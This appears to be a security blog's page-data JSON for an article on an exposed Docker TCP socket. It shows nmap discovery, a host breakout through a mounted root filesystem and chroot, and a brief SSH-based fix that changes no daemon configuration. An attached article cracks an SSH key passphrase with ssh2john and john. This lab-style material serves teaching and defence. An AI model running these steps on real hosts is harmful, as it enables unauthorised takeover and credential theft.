{"componentChunkName":"component---src-templates-blog-post-js","path":"/articles/securely-accessing-remote-docker-host/","result":{"pageContext":{"post":{"fields":{"slug":"/securely-accessing-remote-docker-host"},"excerpt":"Docker is running out box without the socket set evilsaint@marvel.lab:~# docker ps\nCannot connect to the Docker daemon at unix:///var/run…","frontmatter":{"date":"16th August 2021 ","title":"Securely Accessing Remote Docker Host","description":"The Docker TCP socket by default doesn't support any authentication. and, if the Docker socket is exposed on an external interface, anyone can connect to it and issue docker commands. This can even lead to host takeover if the Docker daemon is running as root.","tags":"docker","posttype":"article"},"body":"Docker is running out box without the socket set\n```\nevilsaint@marvel.lab:~# docker ps\nCannot connect to the Docker daemon at unix:///var/run/docker.sock. Is the docker daemon running?\n\nevilsaint@marvel.lab:~# docker images\nCannot connect to the Docker daemon at unix:///var/run/docker.sock. Is the docker daemon running?\n```\n\n\nNmap Scan showing exposed Docker API port. \n```\nnmap -sSV -p- 192.190.96.3\nStarting Nmap 7.91 ( https://nmap.org ) at 2021-08-17 00:34 IST\nNmap scan report for docker-host (192.190.96.3)\nHost is up (0.000015s latency).\nNot shown: 65532 closed ports\nPORT     STATE SERVICE    VERSION\n22/tcp   open  ssh        OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)\n2375/tcp open  docker     Docker 19.03.1 (API 1.40)\n2376/tcp open  tcpwrapped\nMAC Address: 02:42:C0:BE:60:03 (Unknown)\nService Info: OSs: Linux, linux; CPE: cpe:/o:linux:linux_kernel\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 9.11 seconds\n````\n\n\nDefine the DOCKER_HOST environment variable to point to this remote TCP socket.\n```\nexport DOCKER_HOST=192.190.96.3:2375\n```\n\nNow we can mount the image to the host volume and do a host breakout if permissions are in place\n```\nevilsaint@marvel.lab:~# docker run -it -v /:/host ubuntu:18.04 bash\nroot@6a01ea2ace07:/# chroot /host\n#\n```\n\n## How can we secure this \n\nI will SSH into the remote host to perform the fix \n\nLet us kill the docker\n```\nps -ef | grep docker\n```\n\n```\nkill <pid>\n```\n\nRestart the docker service\n```\nservice docker start\n```\n\nNow we export the docker host to be accessible over SSH\n```\nroot@localhost:~# export DOCKER_HOST=ssh://root@192.190.96.3\n```"},"prev":{"fields":{"slug":"/advanced-phishing-tactics"},"excerpt":"","frontmatter":{"date":"17th August 2021 ","title":"Advanced Phishing Tactics","description":"This is the article summary at the top.","tags":"red-teaming","posttype":"article"},"body":""},"next":{"fields":{"slug":"/cracking-ssh-private-key-passphrase"},"excerpt":"root@evilsaint:~# file id_rsa id_rsa: PEM RSA private key\n\nroot@evilsaint:~# whereis ssh2john\nssh2john: /usr/sbin/ssh2john\n\nroot@evilsaint:~…","frontmatter":{"date":"13th August 2021 ","title":"Cracking SSH Private Key Passphrase","description":"","tags":"ssh","posttype":"article"},"body":"\n```\nroot@evilsaint:~# file id_rsa\nid_rsa: PEM RSA private key\n```\n\n\n```\nroot@evilsaint:~# whereis ssh2john\nssh2john: /usr/sbin/ssh2john\n```\n\n\n```\nroot@evilsaint:~# locate ssh2john\n/usr/sbin/ssh2john\n```\n\n```\nroot@evilsaint:~# ssh2john id_rsa > converted_hash\n```\n\n```\nroot@evilsaint:~# john --wordlist=/usr/share/wordlists/rockyou.txt converted_hash\nUsing default input encoding: UTF-8\nLoaded 1 password hash (SSH [RSA/DSA 32/64])\nPress 'q' or Ctrl-C to abort, almost any other key for status\nrevenge2         (id_rsa)\n1g 0:00:00:00 DONE (2021-08-13 21:13) 2.702g/s 636721p/s 636721c/s 636721C/s revenge2\nUse the \"--show\" option to display all of the cracked passwords reliably\nSession completed\n```\n\n\n```\nroot@evilsaint:~# john converted_hash --show\nid_rsa:revenge2\n\n1 password hash cracked, 0 left\n```"}}},"staticQueryHashes":["310218920"],"slicesMap":{}}